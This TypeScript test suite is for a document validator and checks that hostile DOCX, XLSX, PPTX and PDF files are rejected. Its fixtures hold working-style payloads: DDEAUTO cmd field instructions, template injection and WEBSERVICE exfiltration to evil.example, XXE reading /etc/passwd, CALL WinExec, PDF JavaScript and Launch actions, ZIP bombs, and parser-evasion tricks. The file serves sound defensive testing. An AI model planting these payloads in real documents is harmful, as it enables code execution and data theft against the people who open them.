import { strToU8, zipSync, zlibSync } from 'fflate'
import { describe, expect, it } from 'vitest'
import { buildOoxmlCustomProps, buildPdfXmp } from '@besidka/doc-renderer/provenance'
import { parseDocumentSpec } from '@besidka/doc-renderer/spec'
import { validate } from '@besidka/doc-renderer/validate'
import type { ValidatedFormat } from '@besidka/doc-renderer/validate'
import {
  buildPackage,
  buildPdf,
  declareCompressedSize,
  declareUncompressedSize,
  documentXmlWith,
  highRatioPackage,
  markEncrypted,
  markZip64,
  minimalPackage,
  pdfWithAnnotation,
  pdfWithCatalogEntry,
  pdfWithCompressedObjectStream,
  pdfWithMetadata,
  relationshipsXml,
  renameEntry,
  setCompressionMethod,
  sheetXmlWith,
  slideXmlWith,
  withContentTypeOverride,
  withRootRelationship,
  zipWithManyEntries,
} from '../../../fixtures/documents/malicious/builders'

function expectRejected(
  format: ValidatedFormat,
  bytes: Uint8Array,
  code: string,
) {
  const result = validate(format, bytes)

  expect(result.ok).toBe(false)

  if (!result.ok) {
    expect(result.code).toBe(code)
  }
}

describe('validate: common', () => {
  it('rejects empty and oversize input', () => {
    expectRejected('pdf', new Uint8Array(0), 'empty')
    expectRejected('pdf', new Uint8Array(21 * 1024 * 1024), 'too_large')
    expectRejected(
      'docx',
      new Uint8Array(20 * 1024 * 1024 + 1),
      'too_large',
    )
  })

  it('accepts a file of exactly 20 MiB as far as size goes', () => {
    const result = validate('pdf', new Uint8Array(20 * 1024 * 1024))

    expect(result.ok).toBe(false)

    if (!result.ok) {
      expect(result.code).toBe('pdf_header')
    }
  })
})

describe('validate: ZIP container', () => {
  it('accepts a minimal package of each format', () => {
    for (const format of ['docx', 'pptx', 'xlsx'] as const) {
      const result = validate(format, buildPackage(format))

      expect(result.ok, format).toBe(true)

      if (result.ok) {
        expect(result.provenance).toBe('missing')
      }
    }
  })

  it('rejects data that is not a ZIP', () => {
    expectRejected('docx', strToU8('not a zip at all, just text'), 'zip_invalid')
  })

  it('rejects a compression-ratio bomb from the central directory', () => {
    const started = performance.now()

    expectRejected('docx', highRatioPackage('docx'), 'zip_ratio')
    expect(performance.now() - started).toBeLessThan(2000)
  })

  it('rejects an entry-count bomb before reading entries', () => {
    expectRejected('docx', zipWithManyEntries(1001), 'zip_too_many_entries')
  })

  it('rejects path traversal, absolute paths and backslashes', () => {
    const base = buildPackage('docx', { files: { 'word/AAAAAAAA.xml': '<a/>' } })

    expectRejected(
      'docx',
      renameEntry(base, 'word/AAAAAAAA.xml', 'word/../../aa.xml'),
      'zip_unsafe_path',
    )
    expectRejected(
      'docx',
      renameEntry(base, 'word/AAAAAAAA.xml', '/word/AAAAAAA.xml'),
      'zip_unsafe_path',
    )
    expectRejected(
      'docx',
      renameEntry(base, 'word/AAAAAAAA.xml', 'word\\AAAAAAAA.xml'),
      'zip_unsafe_path',
    )
  })

  it('rejects duplicate entry names, ignoring case', () => {
    const base = buildPackage('docx', {
      files: { 'word/aaaa.xml': '<a/>', 'word/bbbb.xml': '<a/>' },
    })

    expectRejected(
      'docx',
      renameEntry(base, 'word/bbbb.xml', 'word/AAAA.xml'),
      'zip_duplicate_entry',
    )
  })

  it('rejects ZIP64 archives', () => {
    expectRejected('docx', markZip64(buildPackage('docx')), 'zip64')
  })

  it('rejects encrypted entries', () => {
    expectRejected(
      'docx',
      markEncrypted(buildPackage('docx'), 'word/document.xml'),
      'zip_encrypted',
    )
  })

  it('rejects unsupported compression methods', () => {
    expectRejected(
      'docx',
      setCompressionMethod(buildPackage('docx'), 'word/document.xml', 12),
      'zip_method',
    )
  })

  it('rejects declared sizes above the per-entry and total caps', () => {
    expectRejected(
      'docx',
      declareUncompressedSize(
        buildPackage('docx'),
        'word/document.xml',
        50 * 1024 * 1024 + 1,
      ),
      'zip_entry_too_large',
    )
  })

  it('stops a forged declared size at the streaming cap', () => {
    const body = `<w:p><w:r><w:t>${'a'.repeat(64 * 1024 * 1024)}</w:t></w:r></w:p>`
    const bomb = zipSync(minimalPackage('docx', { documentBody: body }), {
      level: 9,
    })
    const forged = declareUncompressedSize(bomb, 'word/document.xml', 1024)
    const started = performance.now()

    expectRejected('docx', forged, 'zip_size_mismatch')
    expect(performance.now() - started).toBeLessThan(2000)
  })

  it('rejects a declared size that differs from the inflated length', () => {
    const base = buildPackage('docx')
    const forged = declareUncompressedSize(base, 'word/document.xml', 9999)

    expectRejected('docx', forged, 'zip_size_mismatch')
  })

  it('rejects data that is not valid deflate', () => {
    const base = buildPackage('docx', {
      files: { 'word/extra.xml': '<a>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</a>' },
    })
    const forged = declareCompressedSize(base, 'word/extra.xml', 3)

    const result = validate('docx', forged)

    expect(result.ok).toBe(false)
  })
})

describe('validate: OOXML parts', () => {
  it('rejects macros: vbaProject.bin, vbaData.xml and the macro content type', () => {
    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/vbaProject.bin': 'MZ' } }),
      'ooxml_macro',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', { files: { 'xl/vbaData.xml': '<a/>' } }),
      'ooxml_macro',
    )
    expectRejected(
      'docx',
      buildPackage('docx', {
        mainContentType:
          'application/vnd.ms-word.document.macroEnabled.main+xml',
      }),
      'ooxml_macro',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        files: { 'xl/macrosheets/sheet1.xml': '<a/>' },
      }),
      'ooxml_macro',
    )
  })

  it('rejects a main content type of another format', () => {
    expectRejected(
      'docx',
      buildPackage('docx', {
        mainContentType:
          'application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml',
      }),
      'ooxml_format_mismatch',
    )
    expectRejected('xlsx', buildPackage('docx'), 'ooxml_format_mismatch')
  })

  it('rejects ActiveX, OLE objects, embeddings and custom UI', () => {
    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/activeX/activeX1.xml': '<a/>' } }),
      'ooxml_active_x',
    )
    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/embeddings/oleObject1.bin': 'OLE' } }),
      'ooxml_embedding',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', { files: { 'xl/printerSettings/printer1.bin': 'x' } }),
      'ooxml_ole_object',
    )
    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'customUI/customUI.xml': '<a/>' } }),
      'ooxml_custom_ui',
    )
  })

  it('rejects external links, connections and query tables', () => {
    expectRejected(
      'xlsx',
      buildPackage('xlsx', { files: { 'xl/externalLinks/externalLink1.xml': '<a/>' } }),
      'ooxml_external_link',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', { files: { 'xl/connections.xml': '<a/>' } }),
      'ooxml_data_connection',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', { files: { 'xl/queryTables/queryTable1.xml': '<a/>' } }),
      'ooxml_data_connection',
    )
  })

  it('rejects an attached template (template injection)', () => {
    const relationships = relationshipsXml(
      '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
      + ' Target="https://evil.example/template.dotm" TargetMode="External"/>',
    )

    expectRejected(
      'docx',
      buildPackage('docx', {
        files: { 'word/_rels/settings.xml.rels': relationships },
      }),
      'ooxml_attached_template',
    )
  })

  it('rejects external relationships except https and mailto hyperlinks', () => {
    const hyperlink = (target: string, type = 'hyperlink') => {
      return relationshipsXml(
        '<Relationship Id="rId9"'
        + ` Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}"`
        + ` Target="${target}" TargetMode="External"/>`,
      )
    }
    const withRels = (rels: string) => {
      return buildPackage('docx', { files: { 'word/_rels/document.xml.rels': rels } })
    }

    expect(validate('docx', withRels(hyperlink('https://example.com'))).ok)
      .toBe(true)
    expect(validate('docx', withRels(hyperlink('mailto:a@example.com'))).ok)
      .toBe(true)

    for (const rels of [
      hyperlink('http://example.com'),
      hyperlink('file:///etc/passwd'),
      hyperlink('javascript:alert(1)'),
      hyperlink('https://example.com/img.png', 'image'),
      hyperlink('https://example.com/f.docx', 'subDocument'),
      hyperlink('\\\\evil\\share\\x.dotm', 'oleObject'),
    ]) {
      const result = validate('docx', withRels(rels))

      expect(result.ok, rels).toBe(false)
    }
  })

  it('rejects the root relationship to an external target', () => {
    expectRejected(
      'docx',
      buildPackage('docx', {
        rootRelationships: withRootRelationship(
          'docx',
          '<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"'
          + ' Target="http://169.254.169.254/" TargetMode="External"/>',
        ),
      }),
      'ooxml_external_relationship',
    )
  })

  it('rejects alt chunks, OLE and package relationships', () => {
    const base = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
    const internal = (type: string) => {
      return relationshipsXml(
        `<Relationship Id="rId9" Type="${base}/${type}" Target="x.bin"/>`,
      )
    }

    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/_rels/document.xml.rels': internal('aFChunk') } }),
      'ooxml_alt_chunk',
    )
    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/_rels/document.xml.rels': internal('oleObject') } }),
      'ooxml_ole_object',
    )
    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/_rels/document.xml.rels': internal('package') } }),
      'ooxml_embedding',
    )
  })

  it('rejects DOCTYPE and ENTITY declarations in any XML part (XXE)', () => {
    const xxe = '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<a>&xxe;</a>'

    expectRejected(
      'docx',
      buildPackage('docx', { files: { 'word/other.xml': xxe } }),
      'xml_doctype',
    )
    expectRejected(
      'docx',
      buildPackage('docx', { documentBody: '<!DOCTYPE x><w:p/>' }),
      'xml_doctype',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', { files: { 'xl/styles.xml': '<!ENTITY a "b"><a/>' } }),
      'xml_doctype',
    )
    expectRejected(
      'docx',
      buildPackage('docx', {
        contentTypes: '<!DOCTYPE t><Types/>',
      }),
      'xml_doctype',
    )
  })

  it('rejects a missing content-types part or root relationships', () => {
    expectRejected(
      'docx',
      zipSync({ 'word/document.xml': strToU8(documentXmlWith('')) }),
      'ooxml_missing_part',
    )
  })

  it('does not reject empty directory entries', () => {
    const archive = minimalPackage('pptx')

    archive['ppt/embeddings/'] = new Uint8Array(0)

    expect(validate('pptx', zipSync(archive)).ok).toBe(true)
  })
})

describe('validate: DOCX field instructions', () => {
  function withField(instruction: string) {
    return buildPackage('docx', {
      documentBody:
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        + `<w:r><w:instrText xml:space="preserve">${instruction}</w:instrText></w:r>`
        + '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
    })
  }

  it.each([
    'DDE "cmd" "/c calc" "x"',
    'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"',
    ' INCLUDETEXT "https://evil.example/x.docx"',
    'INCLUDEPICTURE "http://evil.example/x.png"',
    'LINK Excel.Sheet.12 "c:\\\\x.xlsx" "Sheet1!R1C1" \\\\a',
    'ddeauto cmd',
  ])('rejects %s', (instruction) => {
    expectRejected('docx', withField(instruction), 'docx_field_instruction')
  })

  it('rejects an instruction split across runs', () => {
    expectRejected(
      'docx',
      buildPackage('docx', {
        documentBody:
          '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
          + '<w:r><w:instrText>DDE</w:instrText></w:r>'
          + '<w:r><w:instrText>AUTO cmd</w:instrText></w:r>'
          + '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
      }),
      'docx_field_instruction',
    )
  })

  it('rejects fldSimple instructions', () => {
    expectRejected(
      'docx',
      buildPackage('docx', {
        documentBody:
          '<w:p><w:fldSimple w:instr=" DDEAUTO cmd "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>',
      }),
      'docx_field_instruction',
    )
  })

  it('rejects HYPERLINK fields to disallowed targets and allows https', () => {
    expectRejected('docx', withField('HYPERLINK "file:///c:/x"'), 'docx_field_instruction')
    expect(validate('docx', withField('HYPERLINK "https://example.com"')).ok)
      .toBe(true)
    expect(validate('docx', withField('PAGE')).ok).toBe(true)
  })
})

describe('validate: PPTX actions', () => {
  function withAction(action: string) {
    return buildPackage('pptx', {
      slideXml: slideXmlWith(
        `<p:sp><p:nvSpPr><p:cNvPr id="2" name="x"><a:hlinkClick r:id="" action="${action}"/></p:cNvPr></p:nvSpPr></p:sp>`,
      ),
    })
  }

  it.each([
    'ppaction://program',
    'ppaction://macro?name=Module1.Run',
    'ppaction://ole?verb=0',
    'ppaction://hlinkfile',
    'PPACTION://PROGRAM',
  ])('rejects %s', (action) => {
    expectRejected('pptx', withAction(action), 'pptx_action')
  })

  it('allows slide navigation actions', () => {
    expect(validate('pptx', withAction('ppaction://hlinksldjump')).ok).toBe(true)
    expect(validate('pptx', withAction('ppaction://hlinkshowjump?jump=nextslide')).ok)
      .toBe(true)
  })

  it('rejects an action hidden in a relationship target', () => {
    expectRejected(
      'pptx',
      buildPackage('pptx', {
        files: {
          'ppt/slides/_rels/slide1.xml.rels': relationshipsXml(
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="ppaction://program"/>',
          ),
        },
      }),
      'pptx_action',
    )
  })
})

describe('validate: XLSX formulas', () => {
  function withFormula(formula: string, reference = 'A1') {
    return buildPackage('xlsx', {
      sheetXml: sheetXmlWith(
        `<c r="${reference}"><f>${formula}</f><v>0</v></c>`,
      ),
    })
  }

  it('accepts allowlisted formulas', () => {
    for (const formula of [
      'SUM(B2:B10)',
      'IF(A2&gt;0,&quot;yes&quot;,&quot;no&quot;)',
      'VLOOKUP(A2,Data!A:B,2,FALSE)',
      '_xlfn.XLOOKUP(A2,A:A,B:B)',
      'SUM(\'Продажі\'!F2:F501)',
    ]) {
      expect(validate('xlsx', withFormula(formula)).ok, formula).toBe(true)
    }
  })

  it.each([
    ['DDE syntax', 'cmd|\'/c calc\'!A1'],
    ['WEBSERVICE', 'WEBSERVICE(&quot;https://evil.example/?x=&quot;&amp;A1)'],
    ['HYPERLINK', 'HYPERLINK(&quot;https://evil.example&quot;,&quot;x&quot;)'],
    ['FILTERXML', 'FILTERXML(A1,&quot;//a&quot;)'],
    ['INDIRECT', 'INDIRECT(&quot;A&quot;&amp;1)'],
    ['external workbook', '\'[evil.xlsx]Sheet1\'!A1'],
    ['bracket reference', '[1]Sheet1!A1'],
    ['R1C1', 'R1C1+1'],
    ['unknown name', 'SECRET+1'],
    ['CALL', 'CALL(&quot;kernel32&quot;,&quot;WinExec&quot;)'],
  ])('rejects %s', (_label, formula) => {
    const result = validate('xlsx', withFormula(formula))

    expect(result.ok).toBe(false)

    if (!result.ok) {
      expect(result.code).toMatch(/^formula_/)
    }
  })

  it('rejects formulas in unreferenced worksheets and data validations', () => {
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        files: {
          'xl/worksheets/sheet2.xml': sheetXmlWith('<c r="A1"><f>WEBSERVICE(&quot;x&quot;)</f></c>'),
        },
      }),
      'formula_not_allowed',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        sheetXml: `${sheetXmlWith('')}`.replace(
          '</worksheet>',
          '<dataValidations><dataValidation><formula1>WEBSERVICE(&quot;x&quot;)</formula1></dataValidation></dataValidations></worksheet>',
        ),
      }),
      'formula_not_allowed',
    )
  })

  it('rejects data table formulas and external defined names', () => {
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        sheetXml: sheetXmlWith('<c r="A1"><f t="dataTable" ref="A1:B2"/></c>'),
      }),
      'xlsx_formula_type',
    )
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        files: {
          'xl/workbook.xml':
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
            + ' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            + '<sheets><sheet name="Data" sheetId="1" r:id="rId1"/></sheets>'
            + '<definedNames><definedName name="x">cmd|\'/c calc\'!A1</definedName></definedNames></workbook>',
        },
      }),
      'formula_not_allowed',
    )
  })

  it('treats strings that look like formulas as inert text', () => {
    const result = validate('xlsx', buildPackage('xlsx', {
      sheetXml: sheetXmlWith(
        '<c r="A1" t="inlineStr"><is><t>=WEBSERVICE("x")</t></is></c>'
        + '<c r="B1" t="inlineStr"><is><t>@SUM(1)</t></is></c>',
      ),
    }))

    expect(result.ok).toBe(true)
  })

  it('with a spec, every formula must be a declared formula cell', () => {
    const parsed = parseDocumentSpec({
      specVersion: 1,
      format: 'xlsx',
      title: 'Book',
      sheets: [{
        name: 'Data',
        columns: [{ header: 'A', type: 'number' }, { header: 'B', type: 'number' }],
        rows: [[1, { formula: 'SUM(A2:A2)' }]],
      }],
    })

    expect(parsed.ok).toBe(true)

    if (!parsed.ok || parsed.spec.format !== 'xlsx') {
      return
    }

    const declared = buildPackage('xlsx', {
      sheetXml: sheetXmlWith('<c r="B2"><f>SUM(A2:A2)</f></c>'),
    })
    const undeclared = buildPackage('xlsx', {
      sheetXml: sheetXmlWith('<c r="C9"><f>SUM(A2:A2)</f></c>'),
    })

    expect(validate('xlsx', declared, { spec: parsed.spec }).ok).toBe(true)

    const result = validate('xlsx', undeclared, { spec: parsed.spec })

    expect(result.ok).toBe(false)

    if (!result.ok) {
      expect(result.code).toBe('formula_undeclared')
    }
  })
})

describe('validate: provenance', () => {
  it('reports ai, channel-only and missing for OOXML', () => {
    const customProperties = (xml: string) => {
      return buildPackage('docx', {
        contentTypes: withContentTypeOverride(
          'docx',
          '/docProps/custom.xml',
          'application/vnd.openxmlformats-officedocument.custom-properties+xml',
        ),
        rootRelationships: withRootRelationship(
          'docx',
          '<Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom-properties" Target="docProps/custom.xml"/>',
        ),
        files: { 'docProps/custom.xml': xml },
      })
    }
    const ai = validate(
      'docx',
      customProperties(buildOoxmlCustomProps({ model: 'gpt-x', createdVia: 'chat' })),
    )
    const channelOnly = validate(
      'docx',
      customProperties(buildOoxmlCustomProps({ createdVia: 'mcp', aiGenerated: false })),
    )

    expect(ai.ok && ai.provenance).toBe('ai')
    expect(channelOnly.ok && channelOnly.provenance).toBe('channel-only')
    expect(validate('docx', buildPackage('docx')).ok).toBe(true)
  })

  it('reports provenance for PDFs, plain and compressed', () => {
    const ai = buildPdfXmp({ model: 'gpt-x', createdVia: 'chat' })
    const channel = buildPdfXmp({ createdVia: 'mcp', aiGenerated: false })

    for (const compress of [false, true]) {
      const aiResult = validate('pdf', pdfWithMetadata(ai, compress))
      const channelResult = validate('pdf', pdfWithMetadata(channel, compress))

      expect(aiResult.ok && aiResult.provenance).toBe('ai')
      expect(channelResult.ok && channelResult.provenance).toBe('channel-only')
    }

    const missing = validate('pdf', buildPdf())

    expect(missing.ok && missing.provenance).toBe('missing')
  })
})

describe('validate: PDF', () => {
  it('accepts a minimal PDF and counts pages', () => {
    const result = validate('pdf', buildPdf())

    expect(result.ok).toBe(true)

    if (result.ok) {
      expect(result.stats.pages).toBe(1)
    }
  })

  it('checks the header and the %%EOF window', () => {
    expectRejected('pdf', buildPdf({ header: '%PDF-3.0' }), 'pdf_header')
    expectRejected('pdf', buildPdf({ header: 'hello' }), 'pdf_header')
    expectRejected('pdf', buildPdf({ eof: '' }), 'pdf_truncated')
    expectRejected(
      'pdf',
      buildPdf({ rawSuffix: new Uint8Array(1100).fill(0x20) }),
      'pdf_truncated',
    )
    expect(validate('pdf', buildPdf({ header: '%PDF-2.0' })).ok).toBe(true)
  })

  it.each([
    ['JavaScript action', '/Names << /X << /S /JavaScript /JS (app.alert(1)) >> >>', 'pdf_javascript'],
    ['JS key', '/Names << /JS 9 0 R >>', 'pdf_javascript'],
    ['Launch action', '/Names << /X << /S /Launch /F (cmd.exe) >> >>', 'pdf_launch'],
    ['EmbeddedFile', '/Names << /EmbeddedFiles << /Names [] >> >>', 'pdf_embedded_file'],
    ['RichMedia', '/Names << /X << /Subtype /RichMedia >> >>', 'pdf_rich_media'],
    ['XFA', '/AcroForm << /XFA 9 0 R >>', 'pdf_xfa'],
    ['SubmitForm', '/Names << /X << /S /SubmitForm >> >>', 'pdf_submit_form'],
    ['ImportData', '/Names << /X << /S /ImportData >> >>', 'pdf_import_data'],
    ['GoToR', '/Names << /X << /S /GoToR >> >>', 'pdf_goto_remote'],
    ['GoToE', '/Names << /X << /S /GoToE >> >>', 'pdf_goto_remote'],
    ['OpenAction', '/OpenAction [3 0 R /Fit]', 'pdf_open_action'],
    ['AA', '/AA << /WC << /S /Named >> >>', 'pdf_additional_actions'],
    ['Encrypt', '/Encrypt 9 0 R', 'pdf_encrypted'],
  ])('rejects %s', (_label, entry, code) => {
    expectRejected('pdf', pdfWithCatalogEntry(entry), code)
  })

  it('decodes #xx name escapes before matching', () => {
    expectRejected(
      'pdf',
      pdfWithCatalogEntry('/Names << /X << /S /J#61vaScript /JS (x) >> >>'),
      'pdf_javascript',
    )
    expectRejected(
      'pdf',
      pdfWithCatalogEntry('/Names << /#4AS 9 0 R >>'),
      'pdf_javascript',
    )
  })

  it('finds names hidden inside compressed object streams', () => {
    const inner = '<< /S /JavaScript /JS (app.alert(1)) >>'
    const bytes = pdfWithCompressedObjectStream(inner)

    expect(new TextDecoder().decode(bytes).includes('JavaScript')).toBe(false)
    expectRejected('pdf', bytes, 'pdf_javascript')
  })

  it('accepts a clean compressed object stream', () => {
    const result = validate(
      'pdf',
      pdfWithCompressedObjectStream('<< /Type /Annot /Subtype /Text >>'),
    )

    expect(result.ok).toBe(true)
  })

  it('does not scan binary stream data as objects', () => {
    const stream = new TextEncoder().encode(
      '4 0 obj\n<< /S /JavaScript >>\nendobj\n',
    )
    const result = validate('pdf', buildPdf({
      objects: [
        '<< /Type /Catalog /Pages 2 0 R >>',
        '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>',
        `<< /Length ${stream.length} >>\nstream\n${new TextDecoder().decode(stream)}\nendstream`,
      ],
    }))

    expect(result.ok).toBe(true)
  })

  it('allows https and mailto URI actions only', () => {
    const link = (uri: string) => {
      return pdfWithAnnotation(
        `<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (${uri}) >> >>`,
      )
    }

    expect(validate('pdf', link('https://example.com')).ok).toBe(true)
    expect(validate('pdf', link('mailto:a@example.com')).ok).toBe(true)

    for (const uri of ['http://example.com', 'javascript:alert(1)', 'file:///etc/passwd']) {
      expectRejected('pdf', link(uri), 'pdf_uri_scheme')
    }

    expectRejected(
      'pdf',
      pdfWithAnnotation(
        '<< /Type /Annot /Subtype /Link /A << /S /URI /URI <6A6176617363726970743A616C65727428312929> >> >>',
      ),
      'pdf_uri_scheme',
    )
    expectRejected(
      'pdf',
      pdfWithAnnotation(
        '<< /Type /Annot /Subtype /Link /A << /S /URI /URI 9 0 R >> >>',
      ),
      'pdf_uri_scheme',
    )
  })

  it('limits the page count to 200', () => {
    const pages = (count: number) => {
      const kids = Array.from({ length: count }, (_unused, index) => `${index + 3} 0 R`)

      return buildPdf({
        objects: [
          '<< /Type /Catalog /Pages 2 0 R >>',
          `<< /Type /Pages /Kids [${kids.join(' ')}] /Count ${count} >>`,
          ...Array.from({ length: count }, () => {
            return '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>'
          }),
        ],
      })
    }

    expect(validate('pdf', pages(200)).ok).toBe(true)
    expectRejected('pdf', pages(201), 'pdf_too_many_pages')
  })

  it('rejects a PDF without pages and unsupported object-stream filters', () => {
    expectRejected(
      'pdf',
      buildPdf({ objects: ['<< /Type /Catalog >>'] }),
      'pdf_malformed',
    )

    const unsupported = new TextEncoder().encode(
      '%PDF-1.7\n5 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /LZWDecode /Length 3 >>\nstream\nabc\nendstream\nendobj\n%%EOF\n',
    )

    expectRejected('pdf', unsupported, 'pdf_unsupported_filter')
  })

  it('rejects a stream without endstream', () => {
    const bytes = new TextEncoder().encode(
      '%PDF-1.7\n1 0 obj\n<< /Length 3 >>\nstream\nabc\n%%EOF\n',
    )

    expectRejected('pdf', bytes, 'pdf_malformed')
  })
})

describe('validate: parser evasion (review findings)', () => {
  const REL_BASE = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'

  it('reads attributes after a ">" inside an attribute value', () => {
    expectRejected(
      'docx',
      buildPackage('docx', {
        files: {
          'word/_rels/document.xml.rels': relationshipsXml(
            `<Relationship Foo=">" Type="${REL_BASE}/oleObject" Target="x.bin" TargetMode="External"/>`,
          ),
        },
      }),
      'ooxml_ole_object',
    )
  })

  it('handles prefixed elements and CDATA in field instructions', () => {
    expectRejected(
      'docx',
      buildPackage('docx', {
        documentBody: '<x:fldSimple x:instr="DDEAUTO foo"/>',
      }),
      'docx_field_instruction',
    )
    expectRejected(
      'docx',
      buildPackage('docx', {
        documentBody:
          '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><ns:instrText><![CDATA[DDEAUTO foo]]></ns:instrText></w:r></w:p>',
      }),
      'docx_field_instruction',
    )
  })

  it('decodes entities before matching ppaction', () => {
    expectRejected(
      'pptx',
      buildPackage('pptx', {
        slideXml: slideXmlWith(
          '<p:sp><a:hlinkClick action="ppaction&#58;//program"/></p:sp>',
        ),
      }),
      'pptx_action',
    )
  })

  it('checks prefixed cells and formulas', () => {
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        sheetXml: sheetXmlWith('<x:c r="A1"><x:f>cmd|\'/c calc\'!A1</x:f></x:c>'),
      }),
      'formula_not_allowed',
    )
  })

  it('scans parts wherever they sit in the package', () => {
    const moved = buildPackage('xlsx', {
      files: {
        'xl/worksheets/sheet1.xml': null,
        'xl/ws/sheet1.xml': sheetXmlWith('<c r="A1"><f>FOO(1)</f></c>'),
        'xl/_rels/workbook.xml.rels': relationshipsXml(
          `<Relationship Id="rId1" Type="${REL_BASE}/worksheet" Target="ws/sheet1.xml"/>`,
        ),
      },
    })

    expectRejected('xlsx', moved, 'formula_not_allowed')
    expectRejected(
      'xlsx',
      buildPackage('xlsx', {
        files: { 'xl/misc/other.xml': sheetXmlWith('<c r="A1"><f>FOO(1)</f></c>') },
      }),
      'formula_not_allowed',
    )
    expectRejected(
      'docx',
      buildPackage('docx', {
        files: { 'word/webExtensions/webExtension1.xml': '<a/>' },
      }),
      'ooxml_web_extension',
    )
  })

  it('refuses XML that is not UTF-8 or BOM-marked UTF-16', () => {
    const utf16 = (text: string) => {
      const bytes = new Uint8Array(text.length * 2)

      for (let index = 0; index < text.length; index += 1) {
        bytes[index * 2] = text.charCodeAt(index)
      }

      return bytes
    }

    expectRejected(
      'docx',
      buildPackage('docx', {
        files: { 'word/other.xml': utf16('<!DOCTYPE x><a/>') },
      }),
      'xml_encoding',
    )
    expectRejected(
      'docx',
      buildPackage('docx', {
        files: { 'word/other.xml': '\u00ff\u00fe\u0000' },
      }),
      'xml_encoding',
    )
  })

  it('fails closed instead of throwing on hostile entities', () => {
    const result = validate('docx', buildPackage('docx', {
      files: {
        'docProps/custom.xml': '<Properties><property name="a&#x110000;"/></Properties>',
      },
    }))

    expect(result.ok).toBe(true)
  })

  it('keeps hostile PDF tokens linear', () => {
    const token = `${'1'.repeat(150000)}x`
    const started = performance.now()
    const result = validate('pdf', buildPdf({
      objects: [
        '<< /Type /Catalog /Pages 2 0 R >>',
        '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /X ${token} >>`,
      ],
    }))

    expect(result.ok).toBe(true)
    expect(performance.now() - started).toBeLessThan(1000)
  })

  it('keeps unclosed-cell XLSX parts linear', () => {
    const cells = '<c a="1234567890abcdef">'.repeat(40000)
    const started = performance.now()

    validate('xlsx', buildPackage('xlsx', { sheetXml: sheetXmlWith(cells) }))

    expect(performance.now() - started).toBeLessThan(2000)
  })

  it('finds names in object streams with a decoy /Type or no /Type', () => {
    const wrap = (dictionary: string) => {
      const inner = '<< /S /Launch >>'
      const compressed = zlibSync(strToU8(`4 0 ${inner}`))
      const prefix = strToU8(
        '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        + '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
        + '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>\nendobj\n'
        + `5 0 obj\n<< ${dictionary} /Filter /FlateDecode /Length ${compressed.length} >>\nstream\n`,
      )
      const suffix = strToU8('\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n')
      const bytes = new Uint8Array(
        prefix.length + compressed.length + suffix.length,
      )

      bytes.set(prefix)
      bytes.set(compressed, prefix.length)
      bytes.set(suffix, prefix.length + compressed.length)

      return bytes
    }

    expectRejected('pdf', wrap('/Decoy << /Type /X >> /Type /ObjStm /N 1 /First 4'), 'pdf_launch')
    expectRejected('pdf', wrap('/N 1 /First 4'), 'pdf_launch')
    expectRejected(
      'pdf',
      wrap('/Type /ObjStm /N 1 /First 4 /DecodeParms << /Predictor 12 /Columns 12 >>'),
      'pdf_unsupported_filter',
    )
  })

  it('denies file attachments through /EF', () => {
    expectRejected(
      'pdf',
      pdfWithCatalogEntry('/Names << /X << /FS << /EF << /F 6 0 R >> >> >> >>'),
      'pdf_embedded_file',
    )
  })

  it('rejects a forged end record and extra central directory records', () => {
    const base = buildPackage('docx')
    const withComment = new Uint8Array(base.length + 5)

    withComment.set(base)

    expectRejected('docx', withComment, 'zip_invalid')
  })
})
